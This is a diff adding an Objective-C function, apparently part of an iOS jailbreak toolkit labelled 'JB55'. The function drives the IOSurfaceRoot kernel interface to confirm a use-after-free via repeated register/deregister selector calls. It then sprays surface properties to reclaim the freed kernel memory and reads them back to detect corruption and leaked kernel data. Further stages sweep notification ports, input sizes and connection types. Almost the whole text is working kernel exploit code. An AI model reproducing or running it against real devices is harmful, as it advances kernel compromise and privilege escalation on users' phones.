@@ -41529,3 +41529,381 @@ void iosurface_async_callback_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _No
         done(results);
     });
 }
+
+#pragma mark - JB55: Property Cross-Spray + NotifPort + InputSize + ConnType Sweep
+
+void iosurface_property_crossspray(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(0, 0), ^{
+        log(@"JB55: === Property Cross-Spray + NotifPort + InputSize + ConnType ===");
+        log(@"JB55: S1=UAF confirm, S2=prop spray, S3=reverse prop, S4=notif port, S5=input size, S6=conn type");
+
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+        results[@"probe"] = @"JB55";
+
+        typedef void*(*matching_fn)(const char*);
+        typedef unsigned int(*getmatch_fn)(unsigned int, void*);
+        typedef int(*svcopen_fn)(unsigned int, unsigned int, unsigned int, unsigned int*);
+        typedef int(*svcclose_fn)(unsigned int);
+        typedef int(*callmethod_fn)(unsigned int, uint32_t, const uint64_t*, uint32_t, const void*, size_t, uint64_t*, uint32_t*, void*, size_t*);
+        typedef int(*callasync_fn)(unsigned int, uint32_t, unsigned int, uint64_t*, uint32_t, const uint64_t*, uint32_t, const void*, size_t, void*, uint32_t*, uint64_t*, uint32_t*);
+        typedef int(*objrelease_fn)(unsigned int);
+        typedef int(*notifport_fn)(unsigned int, uint32_t, unsigned int, uintptr_t);
+
+        typedef void*(*iosurface_create_fn)(void*);
+        typedef uint32_t(*iosurface_getid_fn)(void*);
+        typedef void(*iosurface_setval_fn)(void*, void*, void*);
+        typedef void*(*iosurface_copyval_fn)(void*, void*);
+
+        matching_fn sym_matching = (matching_fn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        getmatch_fn sym_getmatch = (getmatch_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+        svcopen_fn sym_open = (svcopen_fn)dlsym(RTLD_DEFAULT, "IOServiceOpen");
+        svcclose_fn sym_close = (svcclose_fn)dlsym(RTLD_DEFAULT, "IOServiceClose");
+        callmethod_fn sym_call = (callmethod_fn)dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+        callasync_fn sym_async = (callasync_fn)dlsym(RTLD_DEFAULT, "IOConnectCallAsyncMethod");
+        objrelease_fn sym_release = (objrelease_fn)dlsym(RTLD_DEFAULT, "IOObjectRelease");
+        notifport_fn sym_notif = (notifport_fn)dlsym(RTLD_DEFAULT, "IOConnectSetNotificationPort");
+
+        iosurface_create_fn sym_surf_create = (iosurface_create_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        iosurface_getid_fn sym_surf_getid = (iosurface_getid_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+        iosurface_setval_fn sym_surf_setval = (iosurface_setval_fn)dlsym(RTLD_DEFAULT, "IOSurfaceSetValue");
+        iosurface_copyval_fn sym_surf_copyval = (iosurface_copyval_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCopyValue");
+
+        typedef void*(*cfdictcreate_fn)(void*, const void**, const void**, long, const void*);
+        typedef void*(*cfnumcreate_fn)(void*, int, const void*);
+        typedef void*(*cfstrcreate_fn)(void*, const void*, const char*, int);
+        typedef void*(*cfdatacreate_fn)(void*, const void*, const uint8_t*, long);
+        typedef long(*cfdatalen_fn)(void*);
+        typedef const uint8_t*(*cfdataptr_fn)(void*);
+        typedef void(*cfrelease_fn)(void*);
+        typedef long(*cfgettype_fn)(void*);
+        typedef long(*cfdatatype_fn)(void);
+
+        cfdictcreate_fn sym_dictcreate = (cfdictcreate_fn)dlsym(RTLD_DEFAULT, "CFDictionaryCreate");
+        cfnumcreate_fn sym_numcreate = (cfnumcreate_fn)dlsym(RTLD_DEFAULT, "CFNumberCreate");
+        cfstrcreate_fn sym_strcreate = (cfstrcreate_fn)dlsym(RTLD_DEFAULT, "CFStringCreateWithCString");
+        cfdatacreate_fn sym_datacreate = (cfdatacreate_fn)dlsym(RTLD_DEFAULT, "CFDataCreate");
+        cfdatalen_fn sym_datalen = (cfdatalen_fn)dlsym(RTLD_DEFAULT, "CFDataGetLength");
+        cfdataptr_fn sym_dataptr = (cfdataptr_fn)dlsym(RTLD_DEFAULT, "CFDataGetBytePtr");
+        cfrelease_fn sym_cfrelease = (cfrelease_fn)dlsym(RTLD_DEFAULT, "CFRelease");
+        cfgettype_fn sym_cfgettypeid = (cfgettype_fn)dlsym(RTLD_DEFAULT, "CFGetTypeID");
+        cfdatatype_fn sym_cfdatatypeid = (cfdatatype_fn)dlsym(RTLD_DEFAULT, "CFDataGetTypeID");
+
+        if (!sym_matching || !sym_getmatch || !sym_open || !sym_close || !sym_call || !sym_async ||
+            !sym_surf_create || !sym_surf_getid || !sym_surf_setval || !sym_surf_copyval ||
+            !sym_dictcreate || !sym_numcreate || !sym_strcreate || !sym_datacreate ||
+            !sym_datalen || !sym_dataptr || !sym_cfrelease || !sym_cfgettypeid || !sym_cfdatatypeid) {
+            log(@"JB55: FAIL - dlsym missing symbols");
+            results[@"verdict"] = @"DLSYM_FAIL";
+            done(results);
+            return;
+        }
+
+        log(@"JB55: dlsym OK");
+
+        unsigned int svc = sym_getmatch(0, sym_matching("IOSurfaceRoot"));
+        if (!svc) {
+            log(@"JB55: FAIL - no IOSurfaceRoot service");
+            results[@"verdict"] = @"NO_SERVICE";
+            done(results);
+            return;
+        }
+
+        unsigned int conn = 0;
+        int kr = sym_open(svc, mach_task_self(), 0, &conn);
+        sym_release(svc);
+        if (kr || !conn) {
+            log(@"JB55: FAIL - IOServiceOpen failed");
+            results[@"verdict"] = @"OPEN_FAIL";
+            done(results);
+            return;
+        }
+
+        int w = 256, h = 256, bpe = 4;
+        void *wKey = sym_strcreate(NULL, "IOSurfaceWidth", 0x0600);
+        void *hKey = sym_strcreate(NULL, "IOSurfaceHeight", 0x0600);
+        void *bpeKey = sym_strcreate(NULL, "IOSurfaceBytesPerElement", 0x0600);
+        void *allocKey = sym_strcreate(NULL, "IOSurfaceAllocSize", 0x0600);
+        int allocSz = w * h * bpe;
+        void *wVal = sym_numcreate(NULL, 9, &w);
+        void *hVal = sym_numcreate(NULL, 9, &h);
+        void *bpeVal = sym_numcreate(NULL, 9, &bpe);
+        void *allocVal = sym_numcreate(NULL, 9, &allocSz);
+        const void *keys[] = {wKey, hKey, bpeKey, allocKey};
+        const void *vals[] = {wVal, hVal, bpeVal, allocVal};
+        void *props = sym_dictcreate(NULL, keys, vals, 4, NULL);
+        void *surface = sym_surf_create(props);
+        uint32_t surfID = surface ? sym_surf_getid(surface) : 0;
+        sym_cfrelease(props);
+        sym_cfrelease(wKey); sym_cfrelease(hKey); sym_cfrelease(bpeKey); sym_cfrelease(allocKey);
+        sym_cfrelease(wVal); sym_cfrelease(hVal); sym_cfrelease(bpeVal); sym_cfrelease(allocVal);
+
+        log([NSString stringWithFormat:@"JB55: IOSurface created surfID=%u", surfID]);
+
+        // ===== S1: Quick UAF confirm (2 trials) =====
+        log(@"JB55: --- S1: Quick UAF confirm ---");
+        int s1_hits = 0;
+        for (int trial = 0; trial < 2 && !isr_stopped(); trial++) {
+            unsigned int wp = jb41_newWakePort();
+            uint64_t regIn[3] = {1, 2, 3};
+            int rc_reg = jb41_callSel(conn, 17, regIn, 24, 1, wp, sym_call, sym_async);
+            int rc_dup1 = jb41_callSel(conn, 17, regIn, 24, 1, wp, sym_call, sym_async);
+            int rc_dereg = jb41_callSel(conn, 18, regIn, 24, 0, wp, sym_call, sym_async);
+            int rc_dup2 = jb41_callSel(conn, 17, regIn, 24, 1, wp, sym_call, sym_async);
+            if (rc_dup1 == 0xE00002C9 && rc_dup2 != 0xE00002C9) s1_hits++;
+            log([NSString stringWithFormat:@"JB55: S1 t%d reg=%s dup1=%s dereg=%s dup2=%s %s",
+                 trial, jb41_rcName(rc_reg), jb41_rcName(rc_dup1),
+                 jb41_rcName(rc_dereg), jb41_rcName(rc_dup2),
+                 (rc_dup1 == 0xE00002C9 && rc_dup2 != 0xE00002C9) ? "HIT" : "MISS"]);
+            jb41_callSel(conn, 18, regIn, 24, 0, wp, sym_call, sym_async);
+            jb41_dropPort(wp);
+        }
+        results[@"s1_hits"] = @(s1_hits);
+        log([NSString stringWithFormat:@"JB55: S1 result: %d/2 HIT", s1_hits]);
+
+        // ===== S2: Property cross-spray =====
+        // Set 32 properties on surface, do UAF, set 32 more props to reclaim freed slot,
+        // read all props to detect if any got corrupted by registry entry
+        log(@"JB55: --- S2: Property cross-spray (forward) ---");
+        int s2_corrupted = 0;
+        int s2_total = 0;
+        if (surface && !isr_stopped()) {
+            @try {
+                unsigned int wp2 = jb41_newWakePort();
+                uint64_t regIn2[3] = {0xDEAD0055, 0xBEEF0055, 0xCAFE0055};
+
+                uint8_t propData[24];
+                memset(propData, 0x41, 24);
+
+                for (int i = 0; i < 32 && !isr_stopped(); i++) {
+                    char keyBuf[32];
+                    snprintf(keyBuf, sizeof(keyBuf), "jb55_pre_%02d", i);
+                    void *cfKey = sym_strcreate(NULL, keyBuf, 0x0600);
+                    void *cfVal = sym_datacreate(NULL, NULL, propData, 24);
+                    sym_surf_setval(surface, cfKey, cfVal);
+                    sym_cfrelease(cfKey);
+                    sym_cfrelease(cfVal);
+                }
+
+                int rc_reg = jb41_callSel(conn, 17, regIn2, 24, 1, wp2, sym_call, sym_async);
+                int rc_dereg = jb41_callSel(conn, 18, regIn2, 24, 0, wp2, sym_call, sym_async);
+
+                uint8_t reclaimData[24];
+                memset(reclaimData, 0x42, 24);
+                for (int i = 0; i < 64 && !isr_stopped(); i++) {
+                    char keyBuf[32];
+                    snprintf(keyBuf, sizeof(keyBuf), "jb55_post_%02d", i);
+                    void *cfKey = sym_strcreate(NULL, keyBuf, 0x0600);
+                    void *cfVal = sym_datacreate(NULL, NULL, reclaimData, 24);
+                    sym_surf_setval(surface, cfKey, cfVal);
+                    sym_cfrelease(cfKey);
+                    sym_cfrelease(cfVal);
+                }
+
+                for (int i = 0; i < 32 && !isr_stopped(); i++) {
+                    char keyBuf[32];
+                    snprintf(keyBuf, sizeof(keyBuf), "jb55_pre_%02d", i);
+                    void *cfKey = sym_strcreate(NULL, keyBuf, 0x0600);
+                    void *readVal = sym_surf_copyval(surface, cfKey);
+                    sym_cfrelease(cfKey);
+                    if (readVal) {
+                        s2_total++;
+                        if (sym_cfgettypeid(readVal) == sym_cfdatatypeid()) {
+                            long len = sym_datalen(readVal);
+                            const uint8_t *ptr = sym_dataptr(readVal);
+                            int allA = 1;
+                            for (long j = 0; j < len && j < 24; j++) {
+                                if (ptr[j] != 0x41) { allA = 0; break; }
+                            }
+                            if (!allA) {
+                                s2_corrupted++;
+                                log([NSString stringWithFormat:@"JB55: S2 CORRUPTED pre_%02d first_byte=0x%02x len=%ld",
+                                     i, ptr[0], len]);
+                            }
+                        }
+                        sym_cfrelease(readVal);
+                    }
+                }
+
+                log([NSString stringWithFormat:@"JB55: S2 reg=%s dereg=%s read=%d corrupted=%d",
+                     jb41_rcName(rc_reg), jb41_rcName(rc_dereg), s2_total, s2_corrupted]);
+                jb41_dropPort(wp2);
+            } @catch (NSException *ex) {
+                log([NSString stringWithFormat:@"JB55: S2 exception: %@", ex.reason]);
+            }
+        }
+        results[@"s2_corrupted"] = @(s2_corrupted);
+        results[@"s2_total"] = @(s2_total);
+
+        // ===== S3: Reverse property cross-spray =====
+        // register → deregister → set 32 props → read back → check if any contains our regId
+        log(@"JB55: --- S3: Reverse prop cross-spray (kernel info leak) ---");
+        int s3_leaked = 0;
+        int s3_total = 0;
+        if (surface && !isr_stopped()) {
+            @try {
+                unsigned int wp3 = jb41_newWakePort();
+                uint64_t regIn3[3] = {0x55DEAD55, 0x55BEEF55, 0x55CAFE55};
+
+                int rc_reg3 = jb41_callSel(conn, 17, regIn3, 24, 1, wp3, sym_call, sym_async);
+                int rc_dereg3 = jb41_callSel(conn, 18, regIn3, 24, 0, wp3, sym_call, sym_async);
+
+                uint8_t fillData[24];
+                memset(fillData, 0, 24);
+                for (int i = 0; i < 64 && !isr_stopped(); i++) {
+                    char keyBuf[32];
+                    snprintf(keyBuf, sizeof(keyBuf), "jb55_rev_%02d", i);
+                    void *cfKey = sym_strcreate(NULL, keyBuf, 0x0600);
+                    void *cfVal = sym_datacreate(NULL, NULL, fillData, 24);
+                    sym_surf_setval(surface, cfKey, cfVal);
+                    sym_cfrelease(cfKey);
+                    sym_cfrelease(cfVal);
+                }
+
+                for (int i = 0; i < 64 && !isr_stopped(); i++) {
+                    char keyBuf[32];
+                    snprintf(keyBuf, sizeof(keyBuf), "jb55_rev_%02d", i);
+                    void *cfKey = sym_strcreate(NULL, keyBuf, 0x0600);
+                    void *readVal = sym_surf_copyval(surface, cfKey);
+                    sym_cfrelease(cfKey);
+                    if (readVal) {
+                        s3_total++;
+                        if (sym_cfgettypeid(readVal) == sym_cfdatatypeid()) {
+                            long len = sym_datalen(readVal);
+                            const uint8_t *ptr = sym_dataptr(readVal);
+                            int hasNonZero = 0;
+                            for (long j = 0; j < len && j < 24; j++) {
+                                if (ptr[j] != 0x00) { hasNonZero = 1; break; }
+                            }
+                            if (hasNonZero) {
+                                s3_leaked++;
+                                uint64_t first8 = 0;
+                                if (len >= 8) memcpy(&first8, ptr, 8);
+                                log([NSString stringWithFormat:@"JB55: S3 LEAK rev_%02d first8=0x%llx len=%ld",
+                                     i, (unsigned long long)first8, len]);
+                            }
+                        }
+                        sym_cfrelease(readVal);
+                    }
+                }
+
+                log([NSString stringWithFormat:@"JB55: S3 reg=%s dereg=%s total=%d leaked=%d",
+                     jb41_rcName(rc_reg3), jb41_rcName(rc_dereg3), s3_total, s3_leaked]);
+                jb41_dropPort(wp3);
+            } @catch (NSException *ex) {
+                log([NSString stringWithFormat:@"JB55: S3 exception: %@", ex.reason]);
+            }
+        }
+        results[@"s3_leaked"] = @(s3_leaked);
+        results[@"s3_total"] = @(s3_total);
+
+        // ===== S4: IOConnectSetNotificationPort sweep =====
+        log(@"JB55: --- S4: Notification port sweep ---");
+        int s4_active = 0;
+        if (sym_notif && !isr_stopped()) {
+            @try {
+                unsigned int wp4 = jb41_newWakePort();
+                uint64_t regIn4[3] = {1, 2, 3};
+
+                for (int phase = 0; phase < 2 && !isr_stopped(); phase++) {
+                    if (phase == 1) {
+                        jb41_callSel(conn, 17, regIn4, 24, 1, wp4, sym_call, sym_async);
+                    }
+                    for (uint32_t ntype = 0; ntype < 5 && !isr_stopped(); ntype++) {
+                        int nr = sym_notif(conn, ntype, wp4, 0xAA00 + ntype);
+                        if (nr == 0) s4_active++;
+                        log([NSString stringWithFormat:@"JB55: S4 phase=%d type=%u notif_rc=0x%x %s",
+                             phase, ntype, (unsigned)nr, nr == 0 ? "ACTIVE" : (nr == (int)0xe00002c7 ? "NotReady" : "err")]);
+                    }
+                    if (phase == 1) {
+                        jb41_callSel(conn, 18, regIn4, 24, 0, wp4, sym_call, sym_async);
+                    }
+                }
+                jb41_dropPort(wp4);
+            } @catch (NSException *ex) {
+                log([NSString stringWithFormat:@"JB55: S4 exception: %@", ex.reason]);
+            }
+        }
+        results[@"s4_active"] = @(s4_active);
+
+        // ===== S5: Input size sweep for sel17 =====
+        log(@"JB55: --- S5: Input size sweep (sel17) ---");
+        int s5_variants = 0;
+        if (!isr_stopped()) {
+            @try {
+                unsigned int wp5 = jb41_newWakePort();
+                int sizes[] = {8, 16, 24, 32, 48, 64};
+                for (int si = 0; si < 6 && !isr_stopped(); si++) {
+                    uint64_t bigIn[8] = {1, 2, 3, 4, 5, 6, 7, 8};
+                    int sz = sizes[si];
+                    int rc = jb41_callSel(conn, 17, bigIn, sz, 1, wp5, sym_call, sym_async);
+                    if (rc == 0) {
+                        s5_variants++;
+                        jb41_callSel(conn, 18, bigIn, 24, 0, wp5, sym_call, sym_async);
+                    }
+                    log([NSString stringWithFormat:@"JB55: S5 sz=%d rc=%s %s",
+                         sz, jb41_rcName(rc), rc == 0 ? "OK" : "FAIL"]);
+                }
+                jb41_dropPort(wp5);
+            } @catch (NSException *ex) {
+                log([NSString stringWithFormat:@"JB55: S5 exception: %@", ex.reason]);
+            }
+        }
+        results[@"s5_variants"] = @(s5_variants);
+
+        // ===== S6: Connection type sweep =====
+        log(@"JB55: --- S6: Connection type sweep ---");
+        int s6_types = 0;
+        if (!isr_stopped()) {
+            @try {
+                unsigned int svc2 = sym_getmatch(0, sym_matching("IOSurfaceRoot"));
+                if (svc2) {
+                    for (unsigned int ctype = 1; ctype <= 4 && !isr_stopped(); ctype++) {
+                        unsigned int conn2 = 0;
+                        int okr = sym_open(svc2, mach_task_self(), ctype, &conn2);
+                        if (okr == 0 && conn2) {
+                            s6_types++;
+                            unsigned int wp6 = jb41_newWakePort();
+                            uint64_t regIn6[3] = {1, 2, 3};
+                            int rc_reg = jb41_callSel(conn2, 17, regIn6, 24, 1, wp6, sym_call, sym_async);
+                            int rc_dup = jb41_callSel(conn2, 17, regIn6, 24, 1, wp6, sym_call, sym_async);
+                            jb41_callSel(conn2, 18, regIn6, 24, 0, wp6, sym_call, sym_async);
+                            log([NSString stringWithFormat:@"JB55: S6 type=%u OPEN OK reg=%s dup=%s",
+                                 ctype, jb41_rcName(rc_reg), jb41_rcName(rc_dup)]);
+                            jb41_dropPort(wp6);
+                            sym_close(conn2);
+                        } else {
+                            log([NSString stringWithFormat:@"JB55: S6 type=%u OPEN FAIL rc=0x%x",
+                                 ctype, (unsigned)okr]);
+                        }
+                    }
+                    sym_release(svc2);
+                }
+            } @catch (NSException *ex) {
+                log([NSString stringWithFormat:@"JB55: S6 exception: %@", ex.reason]);
+            }
+        }
+        results[@"s6_types"] = @(s6_types);
+
+        // Cleanup
+        sym_close(conn);
+
+        // Verdict
+        NSString *verdict = @"NO_HIT";
+        if (s2_corrupted > 0) {
+            verdict = @"PROP_ZONE_MATCH";
+        } else if (s3_leaked > 0) {
+            verdict = @"KERNEL_INFO_LEAK";
+        } else if (s4_active > 0) {
+            verdict = @"NOTIF_PORT_ACTIVE";
+        } else if (s5_variants > 1) {
+            verdict = @"SIZE_VARIANT";
+        } else if (s6_types > 0) {
+            verdict = @"NEW_CONN_TYPE";
+        }
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB55: Verdict: %@", verdict]);
+        isr_checkpoint(@"JB55-property-crossspray-checkpoint.json", results);
+        done(results);
+    });
+}
